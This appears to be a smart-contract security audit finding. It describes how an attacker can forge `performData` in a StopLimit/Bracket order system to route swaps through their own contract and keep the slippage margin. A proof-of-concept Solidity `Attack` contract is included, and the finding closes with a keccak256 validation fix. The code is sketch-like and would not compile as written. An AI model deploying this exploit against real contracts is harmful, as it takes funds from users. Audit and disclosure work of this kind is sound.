### Attack Path

1. The attacker calls the `checkUpkeep` function on the `StopLimit` contract.
2. They manipulate the `target` and `txData` in `performData` to point to their own `Attack` contract.

```solidity
contract Attack {
    address public bracketContract;
    address public masterContract;
    address public owner;

    constructor(address _bracket, address _master, address _owner) {
        bracketContract = _bracket;
        masterContract = _master;
        owner = _owner;
    }

    function attack(address tokenIn, address tokenOut, uint256 amountIn, uint256 bips) external {
        uint256 amountOut = masterContract.getMinAmountReceived(amountIn, tokenIn, tokenOut, bips) + 1;

        tokenIn.safeTransferFrom(bracketContract, address(this), amountIn);
        tokenIn.transfer(owner, amountIn);
        tokenOut.transfer(bracketContract, amountOut);

        return (true, bytes(""));
    }
}
```

3. The attacker deposits an amount calculated as `MASTER.getMinAmountReceived(amountIn, tokenIn, tokenOut, bips) + 1` to the `tokenOut` address of their `Attack` contract.
4. The attacker then calls the `performUpkeep` function using the fabricated `performData`.
5. The attacker creates a Bracket Order with a margin (where `takeProfit` and `stopPrice` are set close to the margin).

The margin represents free profit. The higher the `amountIn` and `bips`, the greater the margin (free profit).

### Impact

> #Stop Limit Order with 'Swap-On-Fill'
> User holds 2800 USDC and creates a Stop Limit Order with a stopLimitPrice set to 2800 and swapOnFill set to true
> Once this price is reached, the Stop Limit Order is filled, swapping the 2800 USDC for 1 WETH and creating a new Bracket Order. This new Bracket Order will share the same orderId as the Stop Limit Order

In this scenario, users only receive a calculated amount based on `swapSlippage`, even when they could receive a better token amount.

To prevent this exploit, ensure that `performData` is validated using `keccak256`.
